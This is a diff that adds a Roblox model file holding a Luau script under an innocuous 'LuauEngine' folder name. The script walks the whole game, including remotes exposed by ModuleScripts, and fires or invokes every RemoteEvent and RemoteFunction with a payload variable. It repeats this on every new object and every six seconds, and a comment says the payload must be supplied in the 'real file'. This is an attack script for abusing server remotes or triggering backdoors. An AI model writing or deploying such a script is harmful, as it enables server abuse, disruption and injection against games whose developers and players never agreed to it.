@@ -1,0 +1,63 @@
+<roblox version="4">
+	<Item class="Script" referent="RBX0">
+		<Folder name="LuauEngine">
+			<Script name="Main">
+				<![CDATA[
+local function f(r, b)
+    if not r or not r.Parent then return end
+
+    pcall(function()
+        if r:IsA("RemoteEvent") then
+            r:FireServer(b)
+        elseif r:IsA("RemoteFunction") then
+            r:InvokeServer(b)
+        end
+    end)
+end
+
+local function s(o)
+    if not o then return end
+
+    task.spawn(function()
+        if o:IsA("RemoteEvent") or o:IsA("RemoteFunction") then
+            f(o, tbc)   -- tbc debe existir en tu archivo real
+        end
+
+        if o:IsA("ModuleScript") then
+            local ok, m = pcall(require, o)
+            if ok and type(m) == "table" then
+                for _, v in pairs(m) do
+                    if typeof(v) == "Instance"
+                    and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
+                        f(v, tbc)
+                    end
+                end
+            end
+        end
+
+        for _, c in o:GetChildren() do
+            s(c)
+        end
+    end)
+end
+
+s(game.ReplicatedStorage)
+s(game.StarterPack)
+s(game.StarterPlayer)
+s(game.Workspace)
+
+game.DescendantAdded:Connect(function(o)
+    task.wait(0.05)
+    s(o)
+end)
+
+task.spawn(function()
+    while task.wait(6) do
+        s(game)
+    end
+end)
+				]]>
+			</Script>
+		</Folder>
+	</Item>
+</roblox>
